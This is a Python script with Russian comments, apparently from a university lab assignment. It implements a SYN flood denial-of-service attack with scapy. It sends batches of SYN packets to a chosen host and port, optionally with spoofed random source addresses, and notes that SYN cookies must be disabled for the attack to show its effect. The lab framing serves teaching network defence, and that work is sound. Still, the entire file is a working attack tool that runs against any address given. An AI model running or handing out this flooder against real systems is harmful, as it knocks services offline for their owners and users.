#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
syn_flood.py — учебный SYN-флуд (исчерпание очереди полуоткрытых соединений).

!!! ТОЛЬКО для изолированной лабораторной сети VirtualBox.
!!! Никогда не запускать в реальной сети.

Режимы источника:
  без флага   — источник настоящий (IP атакующей ВМ). Нужен, чтобы показать,
                что блокировка по IP РАБОТАЕТ.  ВАШЕ ядро получит SYN+ACK на
                несуществующее соединение и ответит RST — записи на жертве
                будут «подчищаться», поэтому эффект слабее.
  --spoof     — источник поддельный и случайный. Ответы SYN+ACK уходят «в никуда»,
                полуоткрытые соединения висят до таймаута (tcp_synack_retries) —
                так атака видна лучше всего. Зато блокировка по IP НЕ РАБОТАЕТ.

ВАЖНО (это и есть главный вывод работы):
в современных ядрах Linux `net.ipv4.tcp_syncookies = 1` ВКЛЮЧЕНО ПО УМОЛЧАНИЮ.
Пока SYN-cookies включены, сервер не хранит состояние под полуоткрытое
соединение и атака почти безвредна. Чтобы «увидеть уязвимость», на этапе 3
мы её временно отключаем — а на этапе 4 включаем обратно и сравниваем.

Запуск (атакующая ВМ Alpine Linux):
    sudo python3 syn_flood.py 192.168.56.10 8080 500
    sudo python3 syn_flood.py 192.168.56.10 8080 --spoof --duration 30
"""

import argparse
import random
import time

from scapy.all import IP, TCP, send

BATCH = 50                     # отправляем пачками — так быстрее


def build_packets(target: str, dport: int, count: int, spoof: bool) -> list:
    packets = []
    for _ in range(count):
        if spoof:
            # адрес-источник заведомо не наш: ответы SYN+ACK уйдут «в никуда»
            src = f"10.99.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ip = IP(src=src, dst=target)
        else:
            ip = IP(dst=target)     # источник подставит ядро (наш реальный IP)
        tcp = TCP(sport=random.randint(1024, 65535), dport=dport,
                  flags="S", seq=random.randint(0, 2 ** 32 - 1), window=1024)
        packets.append(ip / tcp)
    return packets


def main() -> None:
    ap = argparse.ArgumentParser(description="Учебный SYN-флуд (только лабораторная сеть!)")
    ap.add_argument("target", help="IP защищаемого хоста")
    ap.add_argument("port", type=int, nargs="?", default=8080, help="порт сервиса")
    ap.add_argument("count", type=int, nargs="?", default=500,
                    help="сколько SYN-пакетов отправить (по умолчанию 500)")
    ap.add_argument("--spoof", action="store_true", help="подделывать IP-источник")
    ap.add_argument("--duration", type=float, default=0,
                    help="слать N секунд (важнее count): нужно, чтобы успеть "
                         "понаблюдать за жертвой")
    ap.add_argument("--iface", default=None, help="сетевой интерфейс (необязательно)")
    args = ap.parse_args()

    mode = "С ПОДДЕЛЬНЫМИ адресами (спуфинг)" if args.spoof else "с реального адреса"
    print(f"[*] Цель: {args.target}:{args.port} | режим: {mode}")
    if args.duration:
        print(f"[*] Длительность: {args.duration:g} c")
    else:
        print(f"[*] Пакетов: {args.count}")
    print("[*] На жертве смотрите:  watch -n1 \"ss -tan state syn-recv | wc -l\"")
    print("[!] Прервать: Ctrl+C")

    sent = 0
    t0 = time.time()
    try:
        while True:
            if args.duration:
                if time.time() - t0 >= args.duration:
                    break
                batch = BATCH
            else:
                if sent >= args.count:
                    break
                batch = min(BATCH, args.count - sent)   # ровно count, без перерасхода
            send(build_packets(args.target, args.port, batch, args.spoof),
                 iface=args.iface, verbose=0)
            sent += batch
    except KeyboardInterrupt:
        print(f"\n[!] Прервано пользователем после {sent} пакетов")

    dt = time.time() - t0
    rate = sent / dt if dt else 0
    print(f"[*] Отправлено {sent} SYN за {dt:.1f} c (~{rate:.0f} пакетов/с)")


if __name__ == "__main__":
    main()
